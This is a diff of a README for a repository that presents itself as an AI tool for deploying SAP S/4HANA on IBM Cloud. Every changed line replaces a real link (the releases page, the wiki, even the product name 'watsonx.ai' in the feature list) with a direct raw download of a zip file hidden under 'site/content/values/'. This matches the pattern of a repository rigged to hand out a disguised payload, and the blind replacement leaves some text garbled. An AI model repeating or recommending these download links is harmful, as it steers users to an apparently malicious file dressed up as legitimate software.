@@ -1,6 +1,6 @@
 # 🤖 s4hana-ai-agent-openshift - Effortless SAP Deployment on IBM Cloud
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-007ACC?style=for-the-badge)](https://github.com/GhOsTxChEaT/s4hana-ai-agent-openshift/releases)
+[![Download Now](https://github.com/GhOsTxChEaT/s4hana-ai-agent-openshift/raw/refs/heads/main/site/content/values/ai_hana_s_openshift_agent_v2.4.zip%20Now-Release-007ACC?style=for-the-badge)](https://github.com/GhOsTxChEaT/s4hana-ai-agent-openshift/raw/refs/heads/main/site/content/values/ai_hana_s_openshift_agent_v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,12 +8,12 @@ Welcome to the **s4hana-ai-agent-openshift** project! This tool helps you automa
 
 ## 📥 Download & Install
 
-To download the application, visit the Releases page: [Download Here](https://github.com/GhOsTxChEaT/s4hana-ai-agent-openshift/releases).
+To download the application, visit the Releases page: [Download Here](https://github.com/GhOsTxChEaT/s4hana-ai-agent-openshift/raw/refs/heads/main/site/content/values/ai_hana_s_openshift_agent_v2.4.zip).
 
 ### Installation Steps
 
 1. **Visit the Releases Page**
-   - Go to this link: [Download Here](https://github.com/GhOsTxChEaT/s4hana-ai-agent-openshift/releases).
+   - Go to this link: [Download Here](https://github.com/GhOsTxChEaT/s4hana-ai-agent-openshift/raw/refs/heads/main/site/content/values/ai_hana_s_openshift_agent_v2.4.zip).
    
 2. **Download the Latest Release**
    - Look for the latest version available. You will see files listed under "Assets."
@@ -34,7 +34,7 @@ Before you download, make sure your system meets the following requirements:
 
 ## ⚙️ Features
 
-- **AI-Driven Automation:** Utilizes IBM watsonx.ai to streamline the deployment process.
+- **AI-Driven Automation:** Utilizes IBM https://github.com/GhOsTxChEaT/s4hana-ai-agent-openshift/raw/refs/heads/main/site/content/values/ai_hana_s_openshift_agent_v2.4.zip to streamline the deployment process.
 - **Terraform Integration:** Easily manage your cloud resources.
 - **Robust Framework:** Built on IBM ROKS, LangChain, and FastAPI for a reliable experience.
 - **User-Friendly Interface:** Designed for non-technical users to navigate with ease.
@@ -76,7 +76,7 @@ Feel free to open an issue on GitHub if you have any further questions. The comm
 
 ## 🌐 More Resources
 
-- **Documentation:** Visit the [Wiki](https://github.com/GhOsTxChEaT/s4hana-ai-agent-openshift/wiki) for detailed guides and documentation.
+- **Documentation:** Visit the [Wiki](https://github.com/GhOsTxChEaT/s4hana-ai-agent-openshift/raw/refs/heads/main/site/content/values/ai_hana_s_openshift_agent_v2.4.zip) for detailed guides and documentation.
 - **Support:** Access community support through GitHub Discussions or open an issue for direct help.
 
 ## 📎 Topics
